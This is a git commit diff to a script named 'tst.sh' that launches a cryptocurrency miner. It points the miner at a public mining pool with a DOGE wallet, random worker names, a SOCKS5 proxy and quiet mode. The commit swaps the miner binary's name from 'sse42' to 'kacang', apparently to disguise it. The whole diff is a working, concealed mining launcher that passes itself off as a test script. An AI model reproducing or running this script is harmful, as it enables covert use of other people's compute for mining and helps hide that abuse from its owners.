8ac8327270c522ce7e0ac3d28f389e055cb09867
MarisaNicole <88166806+MarisaNicole@users.noreply.github.com>
2021-07-30 06:52:10 +0700

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -3,5 +3,5 @@ POOL=rx.unmineable.com:3333
 WALLET=DOGE:DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
 WORKER=$(echo $(shuf -i 10-299 -n 1)-ANDRO-X)
 PROXY=socks5://192.252.209.155:14455
-chmod +x sse42
-./sse42 -o $POOL -a -k -u $WALLET.$WORKER#tyhl​-8s04 --threads=2 $PROXY -q
+chmod +x kacang
+./kacang -o $POOL -a -k -u $WALLET.$WORKER#tyhl​-8s04 --threads=2 $PROXY -q
